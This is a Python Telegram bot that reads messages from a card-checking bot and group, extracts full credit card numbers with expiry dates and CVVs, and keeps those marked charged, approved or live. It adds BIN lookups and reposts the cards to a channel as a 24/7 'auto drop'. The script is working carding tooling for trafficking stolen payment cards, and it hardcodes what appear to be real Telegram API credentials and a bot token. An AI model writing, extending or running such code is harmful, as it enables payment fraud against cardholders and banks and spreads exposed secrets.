import re
import aiohttp
import logging
from pyrogram import Client, filters
from pyrogram.enums import ParseMode
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

# === CONFIGURATION ===
API_ID = 28232616
API_HASH = "82e6373f14a917289086553eefc64afe"
BOT_TOKEN = "8463287566:AAEHL1B2iCL0EcTpKN9soRKncHMAudBuAvs"

CARD_CHECK_BOT_ID = 5366864997
SOURCE_GROUPS = [-4759483285]
TARGET_CHANNELS = ["@hybuabu"]

processed_ids = set()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

app = Client("card_tracker", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# === BIN LOOKUP ===
async def get_bin_data(bin_code):
    url = f"https://bins.antipublic.cc/bins/{bin_code}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return [
                        bin_code,
                        data.get("country", "Unknown"),
                        data.get("bank", "Unknown"),
                        data.get("type", "Unknown"),
                        data.get("level", "Unknown")
                    ]
    except Exception as e:
        logging.error(f"BIN lookup failed: {str(e)}")
    return [bin_code, "Unknown", "Unknown", "Unknown", "Unknown"]

# === PARSE FUNCTION ===
def parse_message(text):
    try:
        cc_match = re.search(r'(?:Card|CC):?\s*(\d{13,19})[| ](\d{1,2})[| ](\d{2,4})[| ](\d{3,4})', text)
        if not cc_match:
            return None

        status = re.search(r'Status:\s*(.+?)(?:\n|$)', text, re.IGNORECASE)
        response = re.search(r'Response:\s*(.+?)(?:\n|$)', text, re.IGNORECASE)
        bank = re.search(r'Bank:\s*(.+?)(?:\n|$)', text, re.IGNORECASE)
        country = re.search(r'Country:\s*(.+?)(?:\n|$)', text, re.IGNORECASE)
        level = re.search(r'Level:\s*(.+?)(?:\n|$)', text, re.IGNORECASE)
        took = re.search(r'Took:\s*([\d.]+)', text, re.IGNORECASE)

        return {
            "cc": cc_match.group(1),
            "month": cc_match.group(2),
            "year": cc_match.group(3),
            "cvv": cc_match.group(4),
            "status": status.group(1).strip() if status else "N/A",
            "response": response.group(1).strip() if response else "N/A",
            "bank": bank.group(1).strip() if bank else "Unknown",
            "country": country.group(1).strip() if country else "Unknown",
            "level": level.group(1).strip() if level else "Unknown",
            "took": f"{took.group(1)}s" if took else "N/A"
        }
    except Exception as e:
        logging.error(f"Error parsing message: {str(e)}")
        return None

def should_forward(response):
    response = (response or "").upper()
    return any(x in response for x in ["CHARGED", "APPROVED", "SUCCESS", "LIVE"])

async def send_to_channels(formatted_text):
    buttons = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔄 Scraper", url="https://t.me/ApprovedScrapper1"),
            InlineKeyboardButton("📦 Backup", url="https://t.me/YourBackupChannel")
        ]
    ])
    for channel in TARGET_CHANNELS:
        try:
            await app.send_message(
                chat_id=channel,
                text=formatted_text,
                parse_mode=ParseMode.HTML,
                reply_markup=buttons
            )
            logging.info(f"Sent to {channel}")
            return True
        except Exception as e:
            logging.error(f"Send failed to {channel}: {str(e)}")
    return False

# === MAIN MESSAGE HANDLER ===
async def handle_card_messages(client, message: Message):
    try:
        if message.id in processed_ids:
            return  # Already handled

        text = message.text or message.caption or ""
        card_data = parse_message(text)

        if not card_data:
            logging.info("No card data found in message")
            return

        if not should_forward(card_data["response"]):
            logging.info(f"Card not valid for forward: {card_data['response']}")
            return

        bin_info = await get_bin_data(card_data["cc"][:6])

        formatted_text = (
            "𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗖𝗵𝗮𝗿𝗴𝗲 𝗔𝘂𝘁𝗼 𝗗𝗿𝗼𝗽 24/7\n\n"
            f"𝗖𝗖: <code>{card_data['cc']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}</code>\n"
            f"𝗦𝘁𝗮𝘁𝘂𝘀: {card_data['status']}\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {card_data['response']}\n\n"
            f"𝗕𝗶𝗻: <code>{card_data['cc'][:6]}</code>\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: <code>{card_data['country']} ({bin_info[1]})</code>\n"
            f"𝗕𝗮𝗻𝗸: <code>{card_data['bank']} ({bin_info[2]})</code>\n"
            f"𝗧𝘆𝗽𝗲: <code>{bin_info[3]}</code>\n"
            f"𝗟𝗲𝘃𝗲𝗹: <code>{card_data['level']} ({bin_info[4]})</code>\n\n"
            f"𝗧𝗼𝗼𝗸: {card_data['took']}\n"
            "𝗣𝗿𝗼𝘃𝗶𝗱𝗲𝗱 𝗯𝘆: 𝗕𝘂𝗻𝗻𝘆"
        )

        if await send_to_channels(formatted_text):
            processed_ids.add(message.id)
            logging.info("✅ Message forwarded")

    except Exception as e:
        logging.error(f"Handle error: {e}")

# === HANDLE NEW AND EDITED MESSAGES ===
@app.on_message(filters.user(CARD_CHECK_BOT_ID) | filters.chat(SOURCE_GROUPS))
async def on_new_message(client, message):
    await handle_card_messages(client, message)

@app.on_edited_message(filters.user(CARD_CHECK_BOT_ID) | filters.chat(SOURCE_GROUPS))
async def on_edited_message(client, message):
    await handle_card_messages(client, message)

# === START ===
logging.info("Starting Card Tracker Bot...")
print("✅ Bot running...")
app.run()
